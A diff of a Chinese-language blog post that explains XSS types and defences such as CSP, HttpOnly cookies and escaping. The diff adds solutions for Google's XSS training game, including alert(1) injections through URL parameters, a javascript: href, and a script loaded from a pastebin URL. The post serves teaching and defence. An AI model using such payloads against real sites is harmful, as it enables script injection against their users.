@@ -6,18 +6,20 @@
   
   <title>XXS | 迷途知返</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="XSS (Cross-site scripting)，即跨站脚本攻击，应该是前端同学都应该听过的网络安全相关的名词。它是一种尝试注入恶意脚本代码到网站上的攻击形式。它可以使得恶意使用者的代码在受影响用户的浏览器端执行，并对用户的影响。原本简称css，为了与前端的级联样式表(cascader style sheet)区分，改称xss。 XSS类型XSS 大致可以分为 3 个类型 反射型 （Refle">
+  <meta name="description" content="XSS (Cross-site scripting)，即跨站脚本攻击，应该是前端同学都应该听过的网络安全相关的名词。它是一种尝试注入恶意脚本代码到网站上的攻击形式。它可以使得恶意使用者的代码在受影响用户的浏览器端执行，并对用户的影响。原本简称 css，为了与前端的级联样式表(cascader style sheet)区分，改称 xss。 XSS 类型XSS 大致可以分为 3 个类型 反射型 （Re">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XXS">
 <meta property="og:url" content="https://mingmingjiang1.github.io/emocoder/2023/05/05/xxs/index.html">
 <meta property="og:site_name" content="迷途知返">
-<meta property="og:description" content="XSS (Cross-site scripting)，即跨站脚本攻击，应该是前端同学都应该听过的网络安全相关的名词。它是一种尝试注入恶意脚本代码到网站上的攻击形式。它可以使得恶意使用者的代码在受影响用户的浏览器端执行，并对用户的影响。原本简称css，为了与前端的级联样式表(cascader style sheet)区分，改称xss。 XSS类型XSS 大致可以分为 3 个类型 反射型 （Refle">
+<meta property="og:description" content="XSS (Cross-site scripting)，即跨站脚本攻击，应该是前端同学都应该听过的网络安全相关的名词。它是一种尝试注入恶意脚本代码到网站上的攻击形式。它可以使得恶意使用者的代码在受影响用户的浏览器端执行，并对用户的影响。原本简称 css，为了与前端的级联样式表(cascader style sheet)区分，改称 xss。 XSS 类型XSS 大致可以分为 3 个类型 反射型 （Re">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://mingmingjiang1.github.io/static/loading.gif">
 <meta property="article:published_time" content="2023-05-05T15:32:24.000Z">
-<meta property="article:modified_time" content="2023-05-05T15:59:01.439Z">
+<meta property="article:modified_time" content="2023-05-06T07:37:50.723Z">
 <meta property="article:author" content="迷途知返">
 <meta property="article:tag" content="前端，xxs，跨站脚本攻击">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mingmingjiang1.github.io/static/loading.gif">
   
     <link rel="alternate" href="/mingmingjiang1.github.io/emocoder/atom.xml" title="迷途知返" type="application/atom+xml">
   
@@ -96,22 +98,30 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>XSS (Cross-site scripting)，即跨站脚本攻击，应该是前端同学都应该听过的网络安全相关的名词。它是一种尝试注入恶意脚本代码到网站上的攻击形式。它可以使得恶意使用者的代码在受影响用户的浏览器端执行，并对用户的影响。原本简称css，为了与前端的级联样式表(cascader style sheet)区分，改称xss。</p>
-<h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><p>XSS 大致可以分为 3 个类型</p>
-<p>反射型 （Reflected XSS Attacks） 此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式，将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。</p>
-<p>存储型（Stored XSS Attacks） 存储型XSS脚本攻击是指Web应用程序会将用户输入的数据信息保存在服务端的数据库或其他文件形式中，网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示，因此存储型XSS具有较强的稳定性。</p>
-<p>DOM-based 型（DOM-based XSS Attacks） DOM-based 的跨站脚本攻击是通过修改页面DOM节点数据信息而形成的跨站脚本攻击。</p>
-<p>为了更加深切的近距离体验xss，可以登陆下<a target="_blank" rel="noopener" href="https://xss-game.appspot.com/level3%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%B8%B8%E6%88%8F%E6%98%AF">https://xss-game.appspot.com/level3，这个游戏是</a> Google 提供的一个 XSS 的小游戏，大家可以自己在浏览器里试试看能不能闯过所有的关卡（可以通过研究 Target Code 来找到可以注入代码的地方，如果想不出来可以看看页面上的 Hints）。建议尽量不要看提示来挑战。这个游戏一共有 6 关，每个关卡利用了各种不同的技巧和方式来插入恶意代码，有些方式确实非常取巧。</p>
-<p>level1:<br>通过在query里拼接script元素，而前端代码又是会展示这个query的，所以没有过滤的话，就直接运行脚本了，直接利用了url插入脚本，属于反射型</p>
-<p>level2:<br>用户提交blog或者评论，前端会展示这些评论或者blog，虽然script元素不会展示，但是像dom节点，如a，img元素还是会展示的，利用了dom，属于dom型，也可以理解为存储型，和存储相关。</p>
+        <p>XSS (Cross-site scripting)，即跨站脚本攻击，应该是前端同学都应该听过的网络安全相关的名词。它是一种尝试注入恶意脚本代码到网站上的攻击形式。它可以使得恶意使用者的代码在受影响用户的浏览器端执行，并对用户的影响。原本简称 css，为了与前端的级联样式表(cascader style sheet)区分，改称 xss。</p>
+<h2 id="XSS-类型"><a href="#XSS-类型" class="headerlink" title="XSS 类型"></a>XSS 类型</h2><p>XSS 大致可以分为 3 个类型</p>
+<p>反射型 （Reflected XSS Attacks） 此种类型的跨站代码存在于 URL 中，所以黑客通常需要通过诱骗或加密变形等方式，将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。</p>
+<p>存储型（Stored XSS Attacks） 存储型 XSS 脚本攻击是指 Web 应用程序会将用户输入的数据信息保存在服务端的数据库或其他文件形式中，网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示，因此存储型 XSS 具有较强的稳定性。</p>
+<p>DOM-based 型（DOM-based XSS Attacks） DOM-based 的跨站脚本攻击是通过修改页面 DOM 节点数据信息而形成的跨站脚本攻击。</p>
+<p>为了更加深切的近距离体验 xss，可以登陆下<a target="_blank" rel="noopener" href="https://xss-game.appspot.com/level3%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%B8%B8%E6%88%8F%E6%98%AF">https://xss-game.appspot.com/level3，这个游戏是</a> Google 提供的一个 XSS 的小游戏，大家可以自己在浏览器里试试看能不能闯过所有的关卡（可以通过研究 Target Code 来找到可以注入代码的地方，如果想不出来可以看看页面上的 Hints）。建议尽量不要看提示来挑战。这个游戏一共有 6 关，每个关卡利用了各种不同的技巧和方式来插入恶意代码，有些方式确实非常取巧。</p>
+<p>level1:<br>通过在 query 里拼接 script 元素，而前端代码又是会展示这个 query 的，所以没有过滤的话，就直接运行脚本了，直接利用了 url 插入脚本，属于反射型</p>
+<p>level2:<br>用户提交 blog 或者评论，前端会展示这些评论或者 blog，虽然 script 元素不会展示，但是像 dom 节点，如 a，img 元素还是会展示的，利用了 dom，属于 dom 型，也可以理解为存储型，和存储相关。</p>
 <p>level3:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">chooseTab</span>(<span class="params">num</span>) &#123;</span><br><span class="line">  <span class="comment">// Dynamically load the appropriate image.</span></span><br><span class="line">  <span class="keyword">var</span> html = <span class="string">&quot;Image &quot;</span> + <span class="built_in">parseInt</span>(num) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  html += <span class="string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line">  $(<span class="string">&#x27;#tabContent&#x27;</span>).<span class="title function_">html</span>(html);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">chooseTab</span>(<span class="params">num</span>) &#123;</span><br><span class="line">  <span class="comment">// Dynamically load the appropriate image.</span></span><br><span class="line">  <span class="keyword">var</span> html = <span class="string">&quot;Image &quot;</span> + <span class="built_in">parseInt</span>(num) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  html += <span class="string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line">  $(<span class="string">&quot;#tabContent&quot;</span>).<span class="title function_">html</span>(html);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>利用了在浏览器直接输入url的漏洞，前端代码会用url里的参数作为img元素的属性直接拼接，由于没有对这些参数做转义，所以可能会导致恶意代码插入，由于利用了dom元素，属于dom型</p>
+<p>利用了在浏览器直接输入 url 的漏洞，前端代码会用 url 里的参数作为 img 元素的属性直接拼接，由于没有对这些参数做转义，所以可能会导致恶意代码插入，由于利用了 dom 元素，属于 dom 型</p>
+<p>level4:<br>服务端模板包含如下代码：<br><img src="/static/loading.gif" onload="startTimer('');" /><br>而timer是从url的参数里取的，如果这个timer包含了其他的js脚本代码，就会有问题，如下：<a target="_blank" rel="noopener" href="https://xss-game.appspot.com/level4/frame?timer=%27);alert(1);var">https://xss-game.appspot.com/level4/frame?timer=&#39;)%3Balert(1)%3Bvar</a> b&#x3D;(‘</p>
+<p>&#x3D;&gt; startTimer(‘’);alert(1);var b&#x3D;(‘’);</p>
+<p>level5:<br>前端脚本：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; next &#125;&#125;&quot;</span>&gt;</span>Next &gt;&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>前端直接利用url的参数拼接成了a元素的href属性：<br><a target="_blank" rel="noopener" href="https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)</a></p>
+<p>level6:<br>服务端代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setInnerText</span>(<span class="params">element, value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (element.<span class="property">innerText</span>) &#123;</span><br><span class="line">    element.<span class="property">innerText</span> = value;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    element.<span class="property">textContent</span> = value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">includeGadget</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> scriptEl = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// This will totally prevent us from loading evil URLs!</span></span><br><span class="line">  <span class="keyword">if</span> (url.<span class="title function_">match</span>(<span class="regexp">/^https?:\/\//</span>)) &#123;</span><br><span class="line">    <span class="title function_">setInnerText</span>(</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;log&quot;</span>),</span><br><span class="line">      <span class="string">&#x27;Sorry, cannot load a URL containing &quot;http&quot;.&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load this awesome gadget</span></span><br><span class="line">  scriptEl.<span class="property">src</span> = url;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Show log messages</span></span><br><span class="line">  scriptEl.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">setInnerText</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;log&quot;</span>), <span class="string">&quot;Loaded gadget from &quot;</span> + url);</span><br><span class="line">  &#125;;</span><br><span class="line">  scriptEl.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">setInnerText</span>(</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;log&quot;</span>),</span><br><span class="line">      <span class="string">&quot;Couldn&#x27;t load gadget from &quot;</span> + url</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(scriptEl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Take the value after # and use it as the gadget filename.</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getGadgetName</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>) || <span class="string">&quot;/static/gadget.js&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">includeGadget</span>(<span class="title function_">getGadgetName</span>());</span><br></pre></td></tr></table></figure>
+<p>这里本来想直接插入script元素的，但是行不通，只有通过script的src外链加载外域脚本：htTps:&#x2F;&#x2F;pastebin.com&#x2F;raw.php?i&#x3D;15S5qZs0<br><a target="_blank" rel="noopener" href="https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0">https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0</a></p>
 <h2 id="更进一步地实验"><a href="#更进一步地实验" class="headerlink" title="更进一步地实验"></a>更进一步地实验</h2><p>因为现在大部分的前后端框架都会有 XSS 相关的安全策略，且默认是开启的，平时想要测试一下 XSS 的漏洞可能还比较麻烦。针对这种情况，可以使用 Damn Vulnerable Web Application （<a target="_blank" rel="noopener" href="https://github.com/digininja/DVWA%EF%BC%89%EF%BC%8C%E5%AE%83%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%BB%E5%8A%A8%E5%85%B3%E9%97%AD%E4%BA%86%E5%90%84%E7%A7%8D%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%E7%9A%84">https://github.com/digininja/DVWA），它是一个主动关闭了各种安全策略的</a> Web 应用，包括了各种各样漏洞，当然也包括 XSS 的部分，可以用来测试自己对这些漏洞的掌握。</p>
 <p>防范手段<br>防御 XSS 一大原则就是不要信任用户输入的内容！所有用户输入的内容都可以默认为不可控的、不安全的，包括但不限于 表单输入&#x2F;URL 等可以由用户任意输入的来源。在回显用户的输入时候一定要做 XSS 的过滤和相应的编码。</p>
 <h2 id="浏览器内置的安全机制"><a href="#浏览器内置的安全机制" class="headerlink" title="浏览器内置的安全机制"></a>浏览器内置的安全机制</h2><p>开启 X-XSS-Protection：针对反射型 XSS 的一种浏览器防御机制，现在大部分现代浏览器已经废弃了这个属性。</p>
-<p>内容安全策略 CSP：CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性) 浏览器的同源策略。</p>
+<p>内容安全策略 CSP：CSP 通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除 XSS 攻击所依赖的载体。一个 CSP 兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和 HTML 的事件处理属性) 浏览器的同源策略。</p>
 <p>Cookie 安全：设置 Cookie 的 HttpOnly 属性，能够最大限度的保证你的 Cookie 不会被脚本所读取并发送到其他服务器上。</p>
 <h2 id="使用成熟的框架安全机制"><a href="#使用成熟的框架安全机制" class="headerlink" title="使用成熟的框架安全机制"></a>使用成熟的框架安全机制</h2><p>对于前端来说，使用常用的库，React&#x2F;Vue&#x2F;Angular 等流行框架来渲染数据基本上都不会有太大的问题。需要注意的是，必须非常非常非常慎重使用类似 React 的 dangerouslySetInnerHTML 或者 Vue 的 v-html 这类绕过 XSS 过滤能力的属性。</p>
 <p>不少后端服务的框架也都在设计时就考虑了 XSS 的安全问题，如 Ruby on Rails。当然这类防御措施还是有其局限性的，并不是能一劳永逸的解决所有攻击威胁的。</p>
@@ -120,21 +130,20 @@
 <p>还有就是更加危险的 eval 方法，虽然一般不会使用，但是需要避免一些隐式的 eval 使用，比如 setTimeout&#x2F;setInterval 就可以通过 setTimeout(codeAsString, delay) 的形式执行任意字符串代码。</p>
 <p>除此之外还有 HTML 标签上的一些事件属性等等。</p>
 <p>如果无可避免的要使用类似方法，一定在渲染前做好过滤和编码工作。</p>
-<h2 id="更加细致的防范-CheatSheet"><a href="#更加细致的防范-CheatSheet" class="headerlink" title="更加细致的防范 CheatSheet"></a>更加细致的防范 CheatSheet</h2><p>开放式Web应用程序安全项目 （ OWASP）提供了针对 XSS 防御的详尽 CheatSheet，感兴趣的同学可以作为参考。</p>
+<h2 id="更加细致的防范-CheatSheet"><a href="#更加细致的防范-CheatSheet" class="headerlink" title="更加细致的防范 CheatSheet"></a>更加细致的防范 CheatSheet</h2><p>开放式 Web 应用程序安全项目 （ OWASP）提供了针对 XSS 防御的详尽 CheatSheet，感兴趣的同学可以作为参考。</p>
 <p><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.htm">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.htm</a></p>
 <p><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html</a></p>
 <h2 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h2><p>一些工具可以扫描网站存在的 XSS 漏洞，可以方便查缺补漏</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.zaproxy.org/">https://www.zaproxy.org/</a></p>
 <h2 id="最后的最后"><a href="#最后的最后" class="headerlink" title="最后的最后"></a>最后的最后</h2><p>需要注意，以上这些防御措施不能详尽描述每个细节和抵御所有 XSS 攻击方式。针对 XSS 的攻防战没有一劳永逸的银弹，也没有傻瓜式的解决方案。只有严格遵照安全最佳实践来尽量避免，并提升安全防范的意识，加强安全审计的工作。</p>
-<p>钓鱼攻击：<br>主要是发生在提交的HTMl内容的时候带有一些其他的域名地址，这些域名地址存在钓鱼的风险。<br>防范方式<br>通过 securitykit.surl 方法进行校验，该方法对非白名单的地址进行剔除。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    <span class="attr">protocolWhiteList</span>: [</span><br><span class="line">            <span class="string">&#x27;http:&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https:&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;file:&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data:&#x27;</span></span><br><span class="line">          ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">api</span>(<span class="string">&#x27;test.file&#x27;</span>, config)) <span class="comment">// &#x27;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">api</span>(<span class="string">&#x27;http://test.file&#x27;</span>, config)) <span class="comment">// &#x27;http://test.file&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>XSS防御方案提供了运行时自动防御风险点的能力，内部是通过运行时+编译时结合实现，底层都是基于两个主要依赖：</p>
+<p>钓鱼攻击：<br>主要是发生在提交的 HTMl 内容的时候带有一些其他的域名地址，这些域名地址存在钓鱼的风险。<br>防范方式<br>通过 securitykit.surl 方法进行校验，该方法对非白名单的地址进行剔除。</p>
+<p>XSS 防御方案最好是在编译时合运行时提供相关的预防方案：编译时预防开发人员出现存在安全漏洞的代码；运行时尽量不相信用户的任何输入</p>
 <ul>
-<li>运行时：提供运行时过滤API，能够过滤不在白名单上的标签以及常见的伪协议字符串。</li>
-<li>编译时：提供Babel插件进行AST风险点识别，在风险点中包裹运行时过滤API，起到自动防御的能力。</li>
+<li>运行时：提供运行时过滤 API，能够过滤不在白名单上的标签以及常见的伪协议字符串。</li>
+<li>编译时：提供 Babel 插件进行 AST 风险点识别，在风险点中包裹运行时过滤 API，起到自动防御的能力。</li>
 </ul>
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/">https://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/</a></p>
 
       
     </div>
@@ -150,6 +159,15 @@
   
     
 <nav id="article-nav">
+  
+    <a href="/mingmingjiang1.github.io/emocoder/2023/05/06/hacktech/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          hacktech
+        
+      </div>
+    </a>
   
   
     <a href="/mingmingjiang1.github.io/emocoder/2023/05/05/git-checkout-%E5%A6%99%E7%94%A8-md/" id="article-nav-older" class="article-nav-link-wrap">
@@ -181,7 +199,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/mingmingjiang1.github.io/emocoder/tags/github-git/" rel="tag">github, git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/mingmingjiang1.github.io/emocoder/tags/%E5%89%8D%E7%AB%AF%EF%BC%8Cxxs%EF%BC%8C%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" rel="tag">前端，xxs，跨站脚本攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/mingmingjiang1.github.io/emocoder/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%EF%BC%8C%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-node/" rel="tag">编译原理，计算机基础, node</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/mingmingjiang1.github.io/emocoder/tags/github-git/" rel="tag">github, git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/mingmingjiang1.github.io/emocoder/tags/%E5%89%8D%E7%AB%AF%EF%BC%8Cnode%EF%BC%8C%E8%B0%83%E8%AF%95%EF%BC%8Cdebug/" rel="tag">前端，node，调试，debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/mingmingjiang1.github.io/emocoder/tags/%E5%89%8D%E7%AB%AF%EF%BC%8Cxxs%EF%BC%8C%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" rel="tag">前端，xxs，跨站脚本攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/mingmingjiang1.github.io/emocoder/tags/%E6%B8%97%E9%80%8F%EF%BC%8C%E7%88%86%E7%A0%B4/" rel="tag">渗透，爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/mingmingjiang1.github.io/emocoder/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%EF%BC%8C%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-node/" rel="tag">编译原理，计算机基础, node</a></li></ul>
     </div>
   </div>
 
@@ -191,7 +209,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/mingmingjiang1.github.io/emocoder/tags/github-git/" style="font-size: 20px;">github, git</a> <a href="/mingmingjiang1.github.io/emocoder/tags/%E5%89%8D%E7%AB%AF%EF%BC%8Cxxs%EF%BC%8C%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" style="font-size: 10px;">前端，xxs，跨站脚本攻击</a> <a href="/mingmingjiang1.github.io/emocoder/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%EF%BC%8C%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-node/" style="font-size: 10px;">编译原理，计算机基础, node</a>
+      <a href="/mingmingjiang1.github.io/emocoder/tags/github-git/" style="font-size: 20px;">github, git</a> <a href="/mingmingjiang1.github.io/emocoder/tags/%E5%89%8D%E7%AB%AF%EF%BC%8Cnode%EF%BC%8C%E8%B0%83%E8%AF%95%EF%BC%8Cdebug/" style="font-size: 10px;">前端，node，调试，debug</a> <a href="/mingmingjiang1.github.io/emocoder/tags/%E5%89%8D%E7%AB%AF%EF%BC%8Cxxs%EF%BC%8C%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" style="font-size: 10px;">前端，xxs，跨站脚本攻击</a> <a href="/mingmingjiang1.github.io/emocoder/tags/%E6%B8%97%E9%80%8F%EF%BC%8C%E7%88%86%E7%A0%B4/" style="font-size: 10px;">渗透，爆破</a> <a href="/mingmingjiang1.github.io/emocoder/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%EF%BC%8C%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-node/" style="font-size: 10px;">编译原理，计算机基础, node</a>
     </div>
   </div>
 
@@ -213,6 +231,14 @@
       <ul>
         
           <li>
+            <a href="/mingmingjiang1.github.io/emocoder/2023/05/07/debug/">debug</a>
+          </li>
+        
+          <li>
+            <a href="/mingmingjiang1.github.io/emocoder/2023/05/06/hacktech/">hacktech</a>
+          </li>
+        
+          <li>
             <a href="/mingmingjiang1.github.io/emocoder/2023/05/05/xxs/">XXS</a>
           </li>
         
@@ -222,14 +248,6 @@
         
           <li>
             <a href="/mingmingjiang1.github.io/emocoder/2023/05/05/git%E5%A4%9A%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/">git多账号管理</a>
-          </li>
-        
-          <li>
-            <a href="/mingmingjiang1.github.io/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/">node从头手写一个基本编译器</a>
-          </li>
-        
-          <li>
-            <a href="/mingmingjiang1.github.io/emocoder/2023/05/05/minic/">(no title)</a>
           </li>
         
       </ul>
